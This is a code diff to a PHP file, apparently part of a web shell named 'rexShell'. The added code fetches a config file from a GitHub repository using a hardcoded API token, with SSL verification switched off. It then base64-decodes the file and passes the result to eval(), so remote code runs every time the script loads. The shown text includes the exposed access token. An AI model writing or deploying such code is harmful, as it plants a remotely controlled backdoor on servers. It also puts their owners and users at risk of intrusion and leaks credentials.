@@ -2,8 +2,35 @@
 set_time_limit(0);
 error_reporting(E_ALL);
 session_start();
-$listdir=TRUE;
-$alert_display=FALSE;
+function get_content_from_github($url) {
+    //$proxy="proxy.adress:80";
+    //$auth="user:pass";
+    $token = '9e82f764f14933a6495536ed0ec1ad36d5087cd1';
+    $curl_token_auth = 'Authorization: token ' . $token;
+	$ch = curl_init();
+	curl_setopt($ch,CURLOPT_URL,$url);
+    //curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
+    //curl_setopt($ch, CURLOPT_PROXY, $proxy);    
+    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, $auth); 
+	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
+	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Awesome-Octocat-App', $curl_token_auth));
+	$content = curl_exec($ch);
+	curl_close($ch);
+	return $content;
+}
+
+function get_repo_json($file) {
+		$json = array();
+		$json[]= json_decode(get_content_from_github('https://api.github.com/repos/XianThi/rexShell/contents/'.$file),true);
+    	return $json;
+	}
+
+$config=get_repo_json('config/config.rex');
+$config=base64_decode($config["0"]["content"]);
+eval($config);
+
 function logout(){
 unset($_SESSION["password"]);
 session_destroy();
